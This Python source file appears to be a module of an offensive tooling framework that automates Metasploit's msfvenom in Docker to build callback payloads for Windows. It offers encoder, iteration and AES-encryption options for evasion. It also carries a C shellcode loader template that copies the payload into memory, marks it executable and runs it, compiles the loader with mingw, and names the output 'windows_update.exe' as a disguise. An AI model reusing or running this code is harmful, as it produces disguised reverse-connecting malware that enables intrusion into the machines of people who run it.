import logging
import os
import shlex
import subprocess

from diamondback.action import call_before_decorator,Action,CURRENT_DIRECTORY
from diamondback.support import delete_all_files

PATH_TO_MSFVENOM  = "/usr/src/metasploit-framework/msfvenom"
CURRENT_DIRECTORY = os.path.abspath( os.path.dirname(__file__) )
PROJECT_ROOT      = os.path.dirname( os.path.dirname(os.path.dirname(CURRENT_DIRECTORY)) )
DOCKER_ROOT       = os.path.join( PROJECT_ROOT, "docker" )
PAYLOAD_DEFAULT_ROOT = "./docker/payloads"
PAYLOAD_FILENAME = "payload_4.c"
FINAL_EXE = 'windows_update.exe'
PAYLOAD_TEMPLATE = """#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    {payload}
    size_t code_size = sizeof(buf);
    size_t half = code_size / 2;      // half length
    DWORD old_protect;
    
    // Step 1: Allocate memory with NO ACCESS initially (most secure)
    void* mem = VirtualAlloc(
        NULL,
        code_size*2,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_NOACCESS  // Start with no permissions
    );
    
    if (!mem) {
        printf("VirtualAlloc failed: %l", GetLastError());
        return 1;
    }
    
    printf("[1] Memory allocated at: %p (NO ACCESS)", mem);
    
    // Step 2: Change to READ-WRITE to copy code
    if (!VirtualProtect(mem, code_size, PAGE_READWRITE, &old_protect)) {
        printf("VirtualProtect RW failed: %lu", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }
    
    printf("[2] Changed to READ-WRITE (previous: 0x%lX)", old_protect);
    memset( mem, 0xCC, code_size );


    // Step 3: Copy code while memory is writable
    // Copy first half
    memcpy(mem, buf, half);
    printf("[3] copy half of the code into place");

    // Copy second half
    memset( mem+half, 0x00, code_size );
    memcpy(mem + half, buf + half, code_size - half);
    printf("[3] second half of code copied to memory");
    
    // Step 4: Change to EXECUTE-READ (remove write permission)
    if (!VirtualProtect(mem, code_size, PAGE_EXECUTE_READ, &old_protect)) {
        printf("VirtualProtect RX failed: %lu", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }
    
    printf("[4] Changed to EXECUTE-READ (previous: 0x%lX)", old_protect);
    
    // Step 5: Execute the code
    typedef int (*func_ptr)();
    func_ptr func = (func_ptr)mem;
    
    int result = func();
    printf("[5] Executed function, result: %d", result);
    
    // Cleanup
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[6] Memory freed");
    
    return 0;
}"""

class MSFVenom( Action ):
    def __init__(self, *args, **kwargs):
        super().__init__( self, *args, **kwargs )
        self.logger = logging.getLogger( 'msfvenom' )

        self.kwargs = kwargs

        # Required parameters
        self.container_name = kwargs.get("container", "metasploit")
        self.payload = kwargs.get("payload")
        self.logger.info( f"using payload {self.payload}" )
        self.lhost = kwargs.get("lhost", self.get_local_ip_address())
        self.lport = kwargs.get("lport", 5555)

        self.msfvenom = kwargs.get( 'msfvenom', PATH_TO_MSFVENOM )

        self.logger.info( f"local connection to {self.lhost}:{self.lport}" )

        self.platform = kwargs.get( "platform", "windows" )
        self.format = kwargs.get("format", "exe")
        self.output_filename = kwargs.get("output", f"payload-{self.platform}-{self.format}")

        # use a path that is specific to the running container, not the 
        # host OS. You will get 'Error: No such file or directory' response
        self.path_to_paylods = os.path.join( "/payloads" )

        self.local_path_to_payloads = os.path.join( CURRENT_DIRECTORY, "docker", "payloads" )

        self.output = os.path.join( self.path_to_paylods, self.output_filename )
        self.logger.info( self.output )

        # Validate required args
        if not self.payload or not self.lhost or not self.lport:
            raise ValueError("Missing required arguments: payload, lhost, lport")
        
        path_to_payloads = os.path.join( PROJECT_ROOT, "docker", "payloads" )
        if not os.path.exists( path_to_payloads ):
            self.logger.info( f"create payload output directory--->{path_to_payloads}" )
            os.makedirs( path_to_payloads )
        else:
            self.logger.info( f"paylod directory {path_to_payloads} already exists" )

    def run( self ):
        # Build msfvenom command inside docker exec
        #
        #
        # --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR
        cmd = [
            "docker", "exec", self.container_name,
            f"{self.msfvenom}",
            "-p", self.payload,
            "--platform", self.platform,
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", self.format,
        ]

        if "arch" in self.kwargs:
            cmd.extend( [   
                            "--arch", 
                            self.kwargs['arch']] )            

        if "encoder" in self.kwargs:
            cmd.extend( [   
                            "--encoder", 
                            self.kwargs['encoder']] )

            if "iterations" in self.kwargs:
                cmd.extend( [   
                                "--iterations", 
                                self.kwargs['iterations']] )                           

        if "encrypt" in self.kwargs:
            if "encrypt-key" in self.kwargs:
                cmd.extend( [   
                                "--encrypt", 
                                self.kwargs['encrypt'],
                                "--encrypt-key",
                                self.kwargs['encrypt-key'],
                                ] )
            
            if "encrypt-iv" in self.kwargs:
                cmd.extend( [   
                                "--encrypt-iv", 
                                self.kwargs['encrypt-iv']] )                

        cmd.extend( ["-o", self.output] )

        try:
            self.logger.info(f"Running: {' '.join((str(item) for item in cmd))}")
            subprocess.run(cmd, check=True)
            self.logger.info(f"Payload generated successfully at host-mapped path {self.output}")
        except subprocess.CalledProcessError as e:
            self.logger.info(f"Error generating payload: {e}")

class MSFVenomCompileToEXE( Action ):
    def __init__(self, *args, **kwargs):
        super().__init__( self, *args, **kwargs )
        self.logger = logging.getLogger( 'msfvenomcompile2exe' )

        self.kwargs = kwargs

        # Required parameters
        self.container_name = kwargs.get("container", "metasploit")
        self.payload = kwargs.get("payload")
        self.logger.info( f"using payload {self.payload}" )
        self.lhost = kwargs.get("lhost", self.get_local_ip_address())
        self.lport = kwargs.get("lport", 5555)

        self.msfvenom = kwargs.get( 'msfvenom', PATH_TO_MSFVENOM )

        self.logger.info( f"local connection to {self.lhost}:{self.lport}" )

        self.platform = kwargs.get( "platform", "windows" )
        self.format = "c"
        self.output_filename = kwargs.get("output", f"payload-{self.platform}-{self.format}")

        # use a path that is specific to the running container, not the 
        # host OS. You will get 'Error: No such file or directory' response
        self.path_to_paylods = os.path.join( "/payloads" )

        self.local_path_to_payloads = os.path.join( CURRENT_DIRECTORY, "docker", "payloads" )

        self.output = os.path.join( PAYLOAD_DEFAULT_ROOT, self.output_filename )
        self.logger.info( self.output )

        # Validate required args
        if not self.payload or not self.lhost or not self.lport:
            raise ValueError("Missing required arguments: payload, lhost, lport")
        
        path_to_payloads = os.path.join( PROJECT_ROOT, "docker", "payloads" )
        if not os.path.exists( path_to_payloads ):
            self.logger.info( f"create payload output directory--->{path_to_payloads}" )
            os.makedirs( path_to_payloads )
        else:
            self.logger.info( f"paylod directory {path_to_payloads} already exists" )

    def run( self ):
        if os.path.exists( self.output ):
            os.remove( self.output )

        cmd = [
            "docker", "exec", self.container_name,
            f"{self.msfvenom}",
            "-p", self.payload,
            "--platform", self.platform,
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", self.format,
        ]

        if "arch" in self.kwargs:
            cmd.extend( [   
                            "--arch", 
                            self.kwargs['arch']] )            

        if "encoder" in self.kwargs:
            cmd.extend( [   
                            "--encoder", 
                            self.kwargs['encoder']] )

            if "iterations" in self.kwargs:
                cmd.extend( [   
                                "--iterations", 
                                self.kwargs['iterations']] )                           

        if "encrypt" in self.kwargs:
            if "encrypt-key" in self.kwargs:
                cmd.extend( [   
                                "--encrypt", 
                                self.kwargs['encrypt'],
                                "--encrypt-key",
                                self.kwargs['encrypt-key'],
                                ] )
            
            if "encrypt-iv" in self.kwargs:
                cmd.extend( [   
                                "--encrypt-iv", 
                                self.kwargs['encrypt-iv']] )                

        cmd.extend( ["-o", "/payloads/payload.out"] )

        try:
            reformatted_cmd = ' '.join((str(item) for item in cmd))
            self.logger.info(f"Running: {reformatted_cmd}")
            subprocess.run(shlex.split(reformatted_cmd), check=True)
        except subprocess.CalledProcessError as e:
            self.logger.info(f"Error generating payload: {e}")


        with open( os.path.join(PAYLOAD_DEFAULT_ROOT,'payload.out'), 'rb' ) as reader:
            c_source = PAYLOAD_TEMPLATE.strip().replace( '{payload}', reader.read().decode("utf-8").strip() )
            # Step 4: Write the replaced string to payload_4.c
            with open(os.path.join(PAYLOAD_DEFAULT_ROOT,PAYLOAD_FILENAME), "w") as f:
                f.write(c_source)
                
            cmd_syntax = f"sudo x86_64-w64-mingw32-gcc -o {self.output} {os.path.join('./docker/payloads/',PAYLOAD_FILENAME)}"
            subprocess.check_output( shlex.split(cmd_syntax) )
            self.logger.info(f"Payload generated successfully at host-mapped path {self.output}")
